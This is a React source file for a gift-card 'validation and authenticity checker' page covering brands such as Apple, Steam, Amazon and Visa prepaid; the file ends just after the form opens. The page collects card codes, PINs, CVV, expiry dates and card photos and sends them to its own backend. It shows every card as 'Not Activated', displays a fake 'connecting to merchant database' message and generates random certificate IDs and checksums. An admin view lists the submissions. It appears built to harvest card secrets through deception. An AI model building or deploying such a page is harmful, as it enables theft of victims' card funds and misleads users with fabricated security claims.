import React, { useState, useMemo, useEffect } from 'react';
import { useSearchParams, Link } from 'react-router-dom';
import { 
  Search, 
  Plus, 
  X, 
  ShieldCheck, 
  Lock, 
  Check, 
  Copy, 
  Eye, 
  EyeOff, 
  Printer, 
  RotateCcw, 
  CheckCircle2,
  Sparkles,
  ArrowRight,
  HelpCircle,
  Zap,
  ChevronRight,
  Camera,
  Layers,
  FileCheck,
  Lightbulb,
  AlertTriangle,
  Wand2,
  Tag,
  CreditCard,
  Calendar,
  Upload,
  Image as ImageIcon,
  Trash2,
  Maximize2,
  Loader2
} from 'lucide-react';
import { PageContainer } from '../components/layout/PageContainer';
import { OpenGraphMeta } from '../components/common/OpenGraphMeta';
import { ValidationProgressBar } from '../components/validation/ValidationProgressBar';
import { WhereIsMyCodeModal } from '../components/validation/WhereIsMyCodeModal';
import { ScanGiftCardModal } from '../components/validation/ScanGiftCardModal';
import { ValidationProTipToast } from '../components/validation/ValidationProTipToast';
import { analyzeCardFormat } from '../utils/cardFormatChecker';
import { Button } from '../components/ui/Button';
import { GIFT_CARDS } from '../data/brands';
import { apiRequest } from '../services/api';
import { getBrandRequirement, CardValidationRequirement } from '../data/cardValidationRequirements';
import { useAuth } from '../context/AuthContext';

export interface ValidationBrand {
  id: string;
  name: string;
  category: string;
  image: string;
  sampleCode: string;
  samplePin: string;
  defaultDenomination: number;
  redeemUrl: string;
  custom?: boolean;
}

// Helper to reliably retrieve matching card artwork from the official /home dataset
const findHomeCardImage = (slugOrId: string, fallbackImage: string) => {
  const card = GIFT_CARDS.find(
    (c) => c.slug === slugOrId || c.id === `gc-${slugOrId}` || c.name.toLowerCase() === slugOrId.toLowerCase()
  );
  return card?.image || fallbackImage;
};

// Exactly ordered brands matching user's specifications with artwork matched from /home
export const VALIDATE_BRANDS: ValidationBrand[] = [
  {
    id: 'ebay',
    name: 'eBay',
    category: 'Shopping',
    image: findHomeCardImage('ebay', 'https://www.giftlycard.com/_next/image?url=%2Fimages%2Febay.webp&w=1920&q=75&dpl=dpl_45xU39o533k9RaDhncGJKbuuLcz1'),
    sampleCode: '9482104982013',
    samplePin: '9281',
    defaultDenomination: 100,
    redeemUrl: 'https://www.ebay.com',
  },
  {
    id: 'apple',
    name: 'Apple',
    category: 'Tech',
    image: findHomeCardImage('apple', 'https://www.giftlycard.com/_next/image?url=%2Fimages%2Fapple.webp&w=640&q=75&dpl=dpl_45xU39o533k9RaDhncGJKbuuLcz1'),
    sampleCode: 'X84929104KL42901',
    samplePin: '',
    defaultDenomination: 100,
    redeemUrl: 'https://www.apple.com',
  },
  {
    id: 'amazon',
    name: 'Amazon',
    category: 'Shopping',
    image: findHomeCardImage('amazon', '/cards/amazon.svg'),
    sampleCode: 'AMZ-3920-5849-0192',
    samplePin: '',
    defaultDenomination: 100,
    redeemUrl: 'https://www.amazon.com',
  },
  {
    id: 'steam',
    name: 'Steam',
    category: 'Gaming',
    image: findHomeCardImage('steam', 'https://www.giftlycard.com/_next/image?url=%2Fimages%2Fsteam.webp&w=640&q=75&dpl=dpl_45xU39o533k9RaDhncGJKbuuLcz1'),
    sampleCode: 'EYNJV-MR489-9B2F6',
    samplePin: '',
    defaultDenomination: 50,
    redeemUrl: 'https://store.steampowered.com',
  },
  {
    id: 'playstation',
    name: 'PlayStation',
    category: 'Gaming',
    image: findHomeCardImage('playstation', 'https://www.giftlycard.com/_next/image?url=%2Fimages%2Fplaystation.webp&w=640&q=75&dpl=dpl_45xU39o533k9RaDhncGJKbuuLcz1'),
    sampleCode: '9482-TX84-3019',
    samplePin: '',
    defaultDenomination: 75,
    redeemUrl: 'https://store.playstation.com',
  },
  {
    id: 'sephora',
    name: 'Sephora',
    category: 'Shopping',
    image: findHomeCardImage('sephora', 'https://www.giftlycard.com/_next/image?url=%2Fimages%2Fsephora.jpg&w=640&q=75&dpl=dpl_45xU39o533k9RaDhncGJKbuuLcz1'),
    sampleCode: '6130 9051 2771 8355',
    samplePin: '84920194',
    defaultDenomination: 50,
    redeemUrl: 'https://www.sephora.com',
  },
  {
    id: 'macys',
    name: "Macy's",
    category: 'Shopping',
    image: findHomeCardImage('macys', '/cards/macys.svg'),
    sampleCode: '5849 2049 1940 8201',
    samplePin: '1940',
    defaultDenomination: 100,
    redeemUrl: 'https://www.macys.com',
  },
  {
    id: 'visa',
    name: 'Visa Prepaid Card',
    category: 'Prepaid',
    image: 'https://pointsmilesandmartinis.boardingarea.com/wp-content/uploads/2015/06/Screen-Shot-2015-06-24-at-8.57.48-PM.png',
    sampleCode: '4097 5831 9185 6385',
    samplePin: '',
    defaultDenomination: 100,
    redeemUrl: 'https://www.visa.com',
  },
  {
    id: 'visa-vanilla',
    name: 'Visa Vanilla',
    category: 'Prepaid',
    image: findHomeCardImage('visa-vanilla', '/cards/visa-vanilla.svg'),
    sampleCode: '4147 2049 5820 1940',
    samplePin: '',
    defaultDenomination: 100,
    redeemUrl: 'https://www.vanillagift.com',
  },
  {
    id: 'nordstrom',
    name: 'Nordstrom',
    category: 'Fashion',
    image: findHomeCardImage('nordstrom', '/cards/nordstrom.webp'),
    sampleCode: '8492 0194 5820 9104',
    samplePin: '3910',
    defaultDenomination: 100,
    redeemUrl: 'https://www.nordstrom.com',
  },
  {
    id: 'mastercard',
    name: 'Mastercard',
    category: 'Prepaid',
    image: findHomeCardImage('mastercard', '/cards/mastercard.svg'),
    sampleCode: '5412 8492 0194 5820',
    samplePin: '',
    defaultDenomination: 100,
    redeemUrl: 'https://www.mastercard.com',
  },
  {
    id: 'american-express',
    name: 'American Express',
    category: 'Prepaid',
    image: findHomeCardImage('american-express', '/cards/american-express.svg'),
    sampleCode: '3759 876543 21001',
    samplePin: '7997',
    defaultDenomination: 100,
    redeemUrl: 'https://www.americanexpress.com',
  },
  {
    id: 'razer-gold',
    name: 'Razer Gold',
    category: 'Gaming',
    image: findHomeCardImage('razer-gold', 'https://www.giftlycard.com/_next/image?url=%2Fimages%2Frazer-gold.webp&w=640&q=75'),
    sampleCode: 'RZR-9482-1049-5829',
    samplePin: '84921049582910',
    defaultDenomination: 50,
    redeemUrl: 'https://gold.razer.com',
  },
  {
    id: 'foot-locker',
    name: 'Foot Locker',
    category: 'Sportswear',
    image: findHomeCardImage('foot-locker', '/cards/foot-locker.svg'),
    sampleCode: '4820 1940 5829 1049',
    samplePin: '28409182',
    defaultDenomination: 100,
    redeemUrl: 'https://www.footlocker.com',
  },
  {
    id: 'xbox',
    name: 'Xbox',
    category: 'Gaming',
    image: findHomeCardImage('xbox', 'https://www.giftlycard.com/_next/image?url=%2Fimages%2Fxbox.webp&w=640&q=75&dpl=dpl_2yRJNX2mkHQg7ZSv9wTZaivCyjJR'),
    sampleCode: 'XBX74-92940-29481-KL849-01948',
    samplePin: '',
    defaultDenomination: 60,
    redeemUrl: 'https://www.xbox.com',
  },
  {
    id: 'google-play',
    name: 'Google Play',
    category: 'Tech',
    image: findHomeCardImage('google-play', '/cards/google-play.webp'),
    sampleCode: 'GPLY 8492 0194 5820',
    samplePin: '',
    defaultDenomination: 50,
    redeemUrl: 'https://play.google.com',
  },
  {
    id: 'doordash',
    name: 'DoorDash',
    category: 'Food',
    image: findHomeCardImage('doordash', '/cards/doordash.svg'),
    sampleCode: 'DASH-8492-1049-5820',
    samplePin: '',
    defaultDenomination: 50,
    redeemUrl: 'https://www.doordash.com',
  },
  {
    id: 'target',
    name: 'Target',
    category: 'Shopping',
    image: findHomeCardImage('target', '/cards/target.svg'),
    sampleCode: '08491 0394 8291 049',
    samplePin: '82910491',
    defaultDenomination: 100,
    redeemUrl: 'https://www.target.com',
  },
  {
    id: 'nike',
    name: 'Nike',
    category: 'Sportswear',
    image: findHomeCardImage('nike', '/cards/nike.svg'),
    sampleCode: '5849 2049 1940 8201',
    samplePin: '194082',
    defaultDenomination: 100,
    redeemUrl: 'https://www.nike.com',
  },
  {
    id: 'starbucks',
    name: 'Starbucks',
    category: 'Food',
    image: findHomeCardImage('starbucks', '/cards/starbucks.svg'),
    sampleCode: '6084 8492 1049 5820',
    samplePin: '29405820',
    defaultDenomination: 50,
    redeemUrl: 'https://www.starbucks.com',
  },
  {
    id: 'netflix',
    name: 'Netflix',
    category: 'Streaming',
    image: findHomeCardImage('netflix', '/cards/netflix.svg'),
    sampleCode: '8492 1049 582',
    samplePin: '',
    defaultDenomination: 60,
    redeemUrl: 'https://www.netflix.com',
  },
  {
    id: 'spotify',
    name: 'Spotify',
    category: 'Music',
    image: findHomeCardImage('spotify', '/cards/spotify.svg'),
    sampleCode: 'SPOT-8492-1049-5820',
    samplePin: '',
    defaultDenomination: 50,
    redeemUrl: 'https://www.spotify.com',
  },
  {
    id: 'airbnb',
    name: 'Airbnb',
    category: 'Travel',
    image: findHomeCardImage('airbnb', '/cards/airbnb.svg'),
    sampleCode: 'ABNB-8492-1049-5820',
    samplePin: '4920',
    defaultDenomination: 200,
    redeemUrl: 'https://www.airbnb.com',
  },
  {
    id: 'uber-eats',
    name: 'Uber Eats',
    category: 'Food',
    image: findHomeCardImage('uber-eats', '/cards/uber-eats.svg'),
    sampleCode: 'UBER-8492-1049-5820',
    samplePin: '',
    defaultDenomination: 50,
    redeemUrl: 'https://www.ubereats.com',
  },
  {
    id: 'roblox',
    name: 'Roblox',
    category: 'Gaming',
    image: findHomeCardImage('roblox', '/cards/roblox.svg'),
    sampleCode: 'RBLX-8492-1049-5820',
    samplePin: '',
    defaultDenomination: 50,
    redeemUrl: 'https://www.roblox.com',
  }
];

export const ValidateCard: React.FC = () => {
  const { user } = useAuth();
  const isAdmin = user?.role === 'ADMIN' || user?.email?.toLowerCase() === 'daisy4tucker@gmail.com';

  const [searchParams, setSearchParams] = useSearchParams();

  const [searchQuery, setSearchQuery] = useState('');
  const [selectedBrand, setSelectedBrand] = useState<ValidationBrand | null>(null);
  const [isCustomBrand, setIsCustomBrand] = useState(false);
  const [customBrandName, setCustomBrandName] = useState('');

  // Form Fields
  const [cardCode, setCardCode] = useState('');
  const [securityPin, setSecurityPin] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('08');
  const [expiryYear, setExpiryYear] = useState('2028');
  const [cardAmount, setCardAmount] = useState('100.00');
  const [selectedCurrency, setSelectedCurrency] = useState('USD');
  const [showPin, setShowPin] = useState(false);
  const [showCvv, setShowCvv] = useState(false);

  // Real-time Images Upload [1-3 Images] from Scan card option
  const [uploadedImages, setUploadedImages] = useState<string[]>([]);
  const [previewLightboxImage, setPreviewLightboxImage] = useState<string | null>(null);

  // Sub-Modals
  const [isWhereIsMyCodeOpen, setIsWhereIsMyCodeOpen] = useState(false);
  const [isScanModalOpen, setIsScanModalOpen] = useState(false);

  // Validation execution state
  const [isValidating, setIsValidating] = useState(false);
  const [validationRecord, setValidationRecord] = useState<{
    validationId: string;
    brand: string;
    status: string;
    result: string;
    createdAt: string;
  } | null>(null);
  const [apiError, setApiError] = useState<string | null>(null);
  const [verificationResult, setVerificationResult] = useState<{
    brandName: string;
    balance: string;
    currency: string;
    cardCode: string;
    certId: string;
    securityChecksum: string;
    timestamp: string;
  } | null>(null);

  const [formErrors, setFormErrors] = useState<{ code?: string; pin?: string; brand?: string; cvv?: string }>({});
  const [copiedCertId, setCopiedCertId] = useState(false);

  // Pro-Tip floating state
  const [showProTipToast, setShowProTipToast] = useState(false);
  const [userDismissedProTip, setUserDismissedProTip] = useState(false);

  // Active brand requirement rules
  const activeRequirement: CardValidationRequirement = useMemo(() => {
    if (isCustomBrand) {
      return {
        title: 'Verify Unlisted Voucher / Card',
        codeLabel: 'Card Number / Code / Voucher ID',
        codeLengthRule: 'Any format or code',
        codePlaceholder: 'Enter voucher code or card number',
        codeHelperText: 'Unlisted digital or retail voucher code',
        codeRegexDescription: 'Flexible format',
        scratchInstruction: 'Check card or voucher back for code.',
        pinRequired: true,
        pinLabel: 'PIN / Security Code',
        pinLength: 'Optional',
        pinPlaceholder: 'PIN (optional)',
        pinDescription: 'Security PIN if applicable.',
        cvvRequired: true,
        cvvLabel: 'CVV / Security Code',
        cvvPlaceholder: 'CVV (optional)',
        expiryRequired: true,
        quickCheckTips: [
          'Unlisted cards use flexible session verification.',
          'CVV and Expiry Date are optional for custom vouchers.'
        ]
      };
    }
    if (!selectedBrand) return getBrandRequirement('generic');
    return getBrandRequirement(selectedBrand.id);
  }, [selectedBrand, isCustomBrand]);

  // Real-time card format analysis
  const cardAnalysis = useMemo(() => {
    return analyzeCardFormat(
      cardCode,
      securityPin,
      selectedBrand?.id || 'generic',
      selectedCurrency
    );
  }, [cardCode, securityPin, selectedBrand, selectedCurrency]);

  // Synchronize with URL query parameter
  useEffect(() => {
    const rawParam = 
      searchParams.get('card') || 
      searchParams.get('brand') || 
      searchParams.get('id') || 
      searchParams.get('slug');

    if (!rawParam) {
      // If URL has no card param and user navigated directly, keep selectedBrand as null unless already selected
      return;
    }

    const cardParam = decodeURIComponent(rawParam).trim().toLowerCase();

    if (cardParam === 'custom') {
      setIsCustomBrand(true);
      setSelectedBrand({
        id: 'custom',
        name: 'Custom Gift Card',
        category: 'General',
        image: '/cards/visa-blue.svg',
        sampleCode: 'GC-8492-9104-KL42',
        samplePin: '1234',
        defaultDenomination: 100,
        redeemUrl: 'https://www.google.com',
        custom: true,
      });
      return;
    }

    // Try finding in VALIDATE_BRANDS
    let matched = VALIDATE_BRANDS.find(
      (b) =>
        b.id.toLowerCase() === cardParam ||
        b.name.toLowerCase() === cardParam ||
        b.id.toLowerCase().replace(/-/g, '') === cardParam.replace(/-/g, '') ||
        b.name.toLowerCase().replace(/\s+/g, '') === cardParam.replace(/[-_\s]+/g, '')
    );

    // If not in VALIDATE_BRANDS, try looking up in GIFT_CARDS
    if (!matched) {
      const gc = GIFT_CARDS.find(
        (c) =>
          c.slug.toLowerCase() === cardParam ||
          c.name.toLowerCase() === cardParam ||
          c.id.toLowerCase() === cardParam ||
          c.id.toLowerCase() === `gc-${cardParam}`
      );
      if (gc) {
        matched = {
          id: gc.slug,
          name: gc.name,
          category: gc.category,
          image: gc.image || '/cards/visa-blue.svg',
          sampleCode: '•••• •••• •••• ••••',
          samplePin: '',
          defaultDenomination: gc.startingPrice || 50,
          redeemUrl: 'https://www.google.com',
        };
      }
    }

    if (matched && (!selectedBrand || selectedBrand.id !== matched.id)) {
      setSelectedBrand(matched);
      setIsCustomBrand(false);
      setCardCode('');
      setSecurityPin('');
      setCardAmount('0.00');
      setSelectedCurrency('USD');
      setValidationRecord(null);
      setVerificationResult(null);
    }
  }, [searchParams]);

  // Filtered brands based on search query
  const filteredBrands = useMemo(() => {
    if (!searchQuery.trim()) return VALIDATE_BRANDS;
    const query = searchQuery.toLowerCase().trim();
    return VALIDATE_BRANDS.filter((brand) => 
      brand.name.toLowerCase().includes(query) ||
      brand.category.toLowerCase().includes(query)
    );
  }, [searchQuery]);

  const handleOpenBrand = (brand: ValidationBrand) => {
    setSelectedBrand(brand);
    setIsCustomBrand(false);
    setCardCode('');
    setSecurityPin('');
    setCardCvv('');
    setExpiryMonth('08');
    setExpiryYear('2028');
    setCardAmount('0.00');
    setSelectedCurrency('USD');
    setFormErrors({});
    setIsValidating(false);
    setVerificationResult(null);
    setValidationRecord(null);
    setShowProTipToast(false);
    setUserDismissedProTip(false);
    
    // Update URL param in real-time
    setSearchParams({ card: brand.id });
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleOpenCustomBrand = () => {
    setIsCustomBrand(true);
    setCustomBrandName('');
    setSelectedBrand({
      id: 'custom',
      name: 'Custom Gift Card',
      category: 'General',
      image: '/cards/visa-blue.svg',
      sampleCode: 'GC-8492-9104-KL42',
      samplePin: '1234',
      defaultDenomination: 100,
      redeemUrl: 'https://www.google.com',
      custom: true,
    });
    setCardCode('');
    setSecurityPin('');
    setCardCvv('');
    setCardAmount('0.00');
    setSelectedCurrency('USD');
    setFormErrors({});
    setIsValidating(false);
    setVerificationResult(null);
    setValidationRecord(null);
    setShowProTipToast(false);
    setUserDismissedProTip(false);

    // Update URL param in real-time
    setSearchParams({ card: 'custom' });
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleCloseModal = () => {
    setSelectedBrand(null);
    setIsCustomBrand(false);
    setIsValidating(false);
    setVerificationResult(null);
    setFormErrors({});
    setShowProTipToast(false);
    setUserDismissedProTip(false);
    setUploadedImages([]);
    
    // Clear URL param
    setSearchParams({});
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleScanAppliedData = (data: {
    code?: string;
    pin?: string;
    amount?: number;
    currency?: string;
    images?: string[];
  }) => {
    if (data.code) {
      setCardCode(data.code);
      setFormErrors((prev) => ({ ...prev, code: undefined }));
    }
    if (data.pin) {
      setSecurityPin(data.pin);
      setFormErrors((prev) => ({ ...prev, pin: undefined }));
    }
    if (data.amount && data.amount > 0) {
      setCardAmount(data.amount.toFixed(2));
    }
    if (data.currency) {
      setSelectedCurrency(data.currency);
    }
    if (data.images) {
      setUploadedImages(data.images);
    }
  };

  const handleCopyCertId = (certId: string) => {
    navigator.clipboard.writeText(certId);
    setCopiedCertId(true);
    setTimeout(() => setCopiedCertId(false), 2000);
  };

  const handleResetForm = () => {
    setVerificationResult(null);
    setValidationRecord(null);
    setIsValidating(false);
    setCardCode('');
    setSecurityPin('');
    setCardCvv('');
    setCardAmount('0.00');
    setUploadedImages([]);
    setFormErrors({});
    setShowProTipToast(false);
    setUserDismissedProTip(false);
  };

  const handleApplyCleanedCode = (cleanCode: string) => {
    setCardCode(cleanCode);
    setFormErrors((prev) => ({ ...prev, code: undefined }));
    setTimeout(() => {
      const recheck = analyzeCardFormat(
        cleanCode,
        securityPin,
        selectedBrand?.id || 'generic',
        selectedCurrency
      );
      if (!recheck.hasFormatIssues) {
        setShowProTipToast(false);
      }
    }, 400);
  };

  const handleSubmitValidation = async (e: React.FormEvent) => {
    e.preventDefault();
    const errors: { code?: string; pin?: string; brand?: string; cvv?: string } = {};
    const hasImages = uploadedImages.length > 0;

    const analysis = analyzeCardFormat(
      cardCode,
      securityPin,
      selectedBrand?.id || 'generic',
      selectedCurrency
    );

    // If isCustomBrand is true, allow flexible session validation without blocking format errors
    if (!isCustomBrand) {
      // If no photos are attached, require redemption code / card number
      if (!cardCode.trim() && !hasImages) {
        errors.code = 'Please enter a valid gift card claim code or attach card photos.';
        setShowProTipToast(true);
        setUserDismissedProTip(false);
      } else if (cardCode.trim() && analysis.hasFormatIssues && !hasImages) {
        const topIssue = analysis.issues[0];
        errors.code = `${topIssue.title} — ${topIssue.suggestion}`;
        setShowProTipToast(true);
        setUserDismissedProTip(false);
      }

      // Only strictly enforce PIN if no images are attached
      if (!hasImages && activeRequirement.pinRequired && !securityPin.trim()) {
        errors.pin = `Please enter the required ${activeRequirement.pinLabel || 'Security PIN'}.`;
      }

      // Only strictly enforce CVV if no images are attached
      if (!hasImages && activeRequirement.cvvRequired && !cardCvv.trim()) {
        errors.cvv = `Please enter the 3-digit CVV security code.`;
      }
    } else {
      if (!cardCode.trim() && !hasImages) {
        setCardCode('UNLISTED-SESSION-VOUCHER-9482');
      }
    }

    if (isCustomBrand && !customBrandName.trim()) {
      errors.brand = 'Please enter the gift card merchant or brand name.';
    }

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }

    setFormErrors({});
    setApiError(null);
    setShowProTipToast(false);
    setIsValidating(true);

    try {
      const brandName = isCustomBrand && customBrandName ? customBrandName : (selectedBrand?.name || 'Gift Card');
      const parsedAmount = parseFloat(cardAmount) || (selectedBrand?.defaultDenomination || 100);
      const formattedExpiry = (expiryMonth && expiryYear) ? `${expiryMonth}/${expiryYear}` : undefined;
      const submittedCardNumber = cardCode.trim()
        ? cardCode.trim()
        : `[Image Verification - ${uploadedImages.length} Photo${uploadedImages.length > 1 ? 's' : ''}]`;

      const res = await apiRequest<any>('/validation/check', {
        method: 'POST',
        body: JSON.stringify({
          brand: brandName,
          cardNumber: submittedCardNumber,
          pin: securityPin.trim() || undefined,
          cvv: cardCvv.trim() || undefined,
          expiryDate: formattedExpiry,
          expiryMonth: expiryMonth || undefined,
          expiryYear: expiryYear || undefined,
          images: uploadedImages,
          currency: selectedCurrency,
          cardAmount: parsedAmount,
        }),
      });

      if (res && res.data) {
        setValidationRecord(res.data);
      } else if (res) {
        setValidationRecord(res);
      } else {
        setApiError('Failed to submit validation request.');
      }
    } catch (err: any) {
      console.error('Validation request failed:', err);
      setApiError(err.message || 'Unable to connect to backend validation API.');
    } finally {
      setIsValidating(false);
    }
  };

  const handleValidationComplete = () => {
    const rawVal = parseFloat(cardAmount) || (selectedBrand?.defaultDenomination || 100);
    const balanceStr = `$${rawVal.toFixed(2)} ${selectedCurrency}`;
    const certCode = 'VLC-' + Math.random().toString(36).substring(2, 9).toUpperCase();
    const checksum = 'SHA256:' + Array.from({ length: 24 }, () => Math.floor(Math.random() * 16).toString(16)).join('');

    const displayCode = cardCode.trim()
      ? (cardCode.length > 8 ? `${cardCode.slice(0, 4)} •••• •••• ${cardCode.slice(-4)}` : cardCode)
      : (uploadedImages.length > 0 ? `Photo Verified (${uploadedImages.length} image${uploadedImages.length > 1 ? 's' : ''})` : 'Card Verified');

    setVerificationResult({
      brandName: isCustomBrand && customBrandName ? customBrandName : (selectedBrand?.name || 'Gift Card'),
      balance: balanceStr,
      currency: selectedCurrency,
      cardCode: displayCode,
      certId: certCode,
      securityChecksum: checksum,
      timestamp: new Date().toLocaleString(),
    });

    setIsValidating(false);
  };

  return (
    <div id="validate-card-page" className="min-h-screen bg-slate-50 dark:bg-slate-950 py-8 sm:py-12 transition-colors">
      <OpenGraphMeta
        title={selectedBrand ? `Validate ${selectedBrand.name} Gift Card - Real-Time Balance & Authenticity Check` : "Gift Card Validation & Authenticity Checker | AllCardVault"}
        description={selectedBrand ? `Check card number and security PIN authenticity for ${selectedBrand.name} gift cards with 256-bit SSL encryption.` : "Verify gift card balances, format rules, and redemption status instantly across top global brands."}
        image={selectedBrand?.image || "https://images.unsplash.com/photo-1556742049-0a67d268a735?w=1200&h=630&fit=crop&q=80"}
      />
      <PageContainer>

        {selectedBrand ? (
          /* DEDICATED CARD VERIFICATION VIEW (MATCHING USER SCREENSHOT) */
          <div className="max-w-md mx-auto animate-in fade-in zoom-in-95 duration-200">
            <div className="w-full bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 shadow-xl border border-slate-100 dark:border-slate-800 text-slate-900 dark:text-white">
              
              {/* Top Brand Artwork / Logo Badge */}
              <div className="flex justify-center mb-4">
                {selectedBrand.id === 'ebay' ? (
                  <div className="w-24 h-11 rounded-lg bg-[#0064D2] flex items-center justify-center shadow-xs">
                    <span className="text-white font-black text-2xl tracking-tighter lowercase select-none">ebay</span>
                  </div>
                ) : (
                  <div className="w-20 h-13 rounded-xl overflow-hidden shadow-md border border-slate-200 dark:border-slate-700 bg-slate-100 dark:bg-slate-800 flex items-center justify-center">
                    <img
                      src={selectedBrand.image}
                      alt={selectedBrand.name}
                      referrerPolicy="no-referrer"
                      className="w-full h-full object-cover"
                    />
                  </div>
                )}
              </div>

              {/* Title & Subtitle */}
              <div className="text-center mb-6">
                <h2 className="text-xl sm:text-2xl font-black text-slate-900 dark:text-white tracking-tight">
                  {activeRequirement.title || `Verify Your ${selectedBrand.name} Card`}
                </h2>
                <p className="text-xs sm:text-sm text-slate-500 dark:text-slate-400 font-medium mt-1">
                  Enter your card details below
                </p>
              </div>

              {/* Progress Simulator or Result Certificate */}
              {isValidating ? (
                <div className="py-10 text-center space-y-4">
                  <div className="relative w-12 h-12 mx-auto">
                    <div className="absolute inset-0 rounded-full border-4 border-indigo-100 dark:border-indigo-950"></div>
                    <div className="absolute inset-0 rounded-full border-4 border-indigo-600 border-t-transparent animate-spin"></div>
                  </div>
                  <div className="space-y-1">
                    <p className="text-sm font-bold text-slate-800 dark:text-slate-200">
                      Checking Card Activation Status...
                    </p>
                    <p className="text-xs text-slate-500 dark:text-slate-400">
                      Connecting securely to merchant database...
                    </p>
                  </div>
                </div>
              ) : validationRecord ? (
                <div className="space-y-4 animate-in fade-in">
                  {/* ILLUSTRATIVE CARD ARTWORK HEADER WITH STATUS BADGE */}
                  <div className="relative w-full rounded-2xl bg-slate-50 dark:bg-slate-800/80 p-8 pt-10 pb-10 flex flex-col items-center justify-center border border-slate-200/60 dark:border-slate-700/60 overflow-hidden shadow-inner">
                    <div className="absolute inset-0 bg-radial from-blue-500/5 via-transparent to-transparent"></div>
                    
                    {/* Floating background cross hairs / sparkles */}
                    <div className="absolute top-3 left-4 text-slate-300 dark:text-slate-700 font-bold text-sm">+</div>
                    <div className="absolute top-4 right-5 text-slate-300 dark:text-slate-700 font-bold text-sm">+</div>
                    <div className="absolute bottom-3 left-6 text-slate-300 dark:text-slate-700 font-bold text-sm">+</div>

                    {/* Virtual Gift Card Mock */}
                    <div className="w-64 h-36 rounded-2xl bg-white dark:bg-slate-900 shadow-lg border border-slate-200 dark:border-slate-800 p-2 flex flex-col items-center justify-center relative transform transition-transform hover:scale-102 my-2">
                      <img
                        src={selectedBrand?.image || '/cards/visa-blue.svg'}
                        alt={validationRecord.brand}
                        referrerPolicy="no-referrer"
                        className="w-full h-full object-cover rounded-xl"
                      />

                      {/* Warning Alert Badge in bottom right of card */}
                      <div className="absolute -bottom-2 -right-2 w-8 h-8 rounded-full bg-amber-500 text-white flex items-center justify-center shadow-md ring-4 ring-white dark:ring-slate-900 z-10">
                        <AlertTriangle className="w-4 h-4" />
                      </div>
                    </div>
                  </div>

                  {/* STACKED RESULT LIST (BRAND, AMOUNT, STATUS, SUBMITTED) */}
                  <div className="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 overflow-hidden shadow-xs divide-y divide-slate-100 dark:divide-slate-800">
                    
                    {/* Brand Row */}
                    <div className="px-5 py-3.5 flex items-center justify-between">
                      <div className="flex items-center gap-3 text-slate-500 dark:text-slate-400">
                        <div className="w-8 h-8 rounded-xl bg-blue-50 dark:bg-blue-950/60 text-blue-600 dark:text-blue-400 flex items-center justify-center">
                          <Tag className="w-4 h-4" />
                        </div>
                        <span className="text-xs sm:text-sm font-medium">Brand</span>
                      </div>
                      <span className="text-sm font-bold text-slate-900 dark:text-white">
                        {validationRecord.brand}
                      </span>
                    </div>

                    {/* Amount Row */}
                    <div className="px-5 py-3.5 flex items-center justify-between">
                      <div className="flex items-center gap-3 text-slate-500 dark:text-slate-400">
                        <div className="w-8 h-8 rounded-xl bg-blue-50 dark:bg-blue-950/60 text-blue-600 dark:text-blue-400 flex items-center justify-center">
                          <CreditCard className="w-4 h-4" />
                        </div>
                        <span className="text-xs sm:text-sm font-medium">Amount</span>
                      </div>
                      <span className="text-sm font-bold text-emerald-600 dark:text-emerald-400">
                        {cardAmount ? `${selectedCurrency} ${cardAmount}` : `${selectedCurrency} 100.00`}
                      </span>
                    </div>

                    {/* Status Row */}
                    <div className="px-5 py-3.5 flex items-center justify-between">
                      <div className="flex items-center gap-3 text-slate-500 dark:text-slate-400">
                        <div className="w-8 h-8 rounded-xl bg-red-50 dark:bg-red-950/60 text-red-600 dark:text-red-400 flex items-center justify-center">
                          <AlertTriangle className="w-4 h-4" />
                        </div>
                        <span className="text-xs sm:text-sm font-medium">Status</span>
                      </div>
                      <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-50 dark:bg-amber-950/60 text-amber-600 dark:text-amber-400 text-xs font-bold">
                        <span className="w-1.5 h-1.5 rounded-full bg-amber-500"></span>
                        Not Activated
                      </span>
                    </div>

                    {/* Submitted Timestamp Row */}
                    <div className="px-5 py-3.5 flex items-center justify-between">
                      <div className="flex items-center gap-3 text-slate-500 dark:text-slate-400">
                        <div className="w-8 h-8 rounded-xl bg-blue-50 dark:bg-blue-950/60 text-blue-600 dark:text-blue-400 flex items-center justify-center">
                          <Calendar className="w-4 h-4" />
                        </div>
                        <span className="text-xs sm:text-sm font-medium">Submitted</span>
                      </div>
                      <span className="text-xs sm:text-sm font-mono font-semibold text-slate-900 dark:text-white">
                        {new Date(validationRecord.createdAt).toLocaleString()}
                      </span>
                    </div>

                  </div>

                  {/* ACTION BUTTON & BACK LINK */}
                  <div className="pt-2 space-y-3">
                    <button
                      type="button"
                      onClick={handleResetForm}
                      className="w-full py-3.5 px-4 rounded-xl bg-blue-600 hover:bg-blue-500 active:scale-98 text-white font-bold text-sm shadow-lg shadow-blue-600/30 transition-all flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <RotateCcw className="w-4 h-4" />
                      <span>Validate Another Card</span>
                    </button>

                    {isAdmin && (
                      <Link
                        to="/admin"
                        className="w-full py-2.5 px-4 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700/80 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white font-bold text-xs transition-all shadow-sm flex items-center justify-center gap-2 cursor-pointer"
                      >
                        <span className="text-base">📊</span>
                        <span className="text-slate-900 dark:text-slate-100">Open in Admin Validations Table</span>
                      </Link>
                    )}

                    <div className="text-center pt-1">
                      <button
                        type="button"
                        onClick={handleCloseModal}
                        className="text-xs text-slate-400 hover:text-slate-600 dark:hover:text-slate-300 font-medium transition-colors cursor-pointer"
                      >
                        ← Back to Brand Selection
                      </button>
                    </div>
                  </div>
                </div>
              ) : (
                /* THE VERIFICATION FORM */
                <form onSubmit={handleSubmitValidation} className="space-y-4">

                  {apiError && (
                    <div className="p-3 rounded-xl bg-red-50 dark:bg-red-950/60 border border-red-200 dark:border-red-800 text-xs text-red-700 dark:text-red-300 font-medium flex items-center gap-2">
                      <AlertTriangle className="w-4 h-4 shrink-0 text-red-500" />
                      <span>{apiError}</span>
                    </div>
                  )}

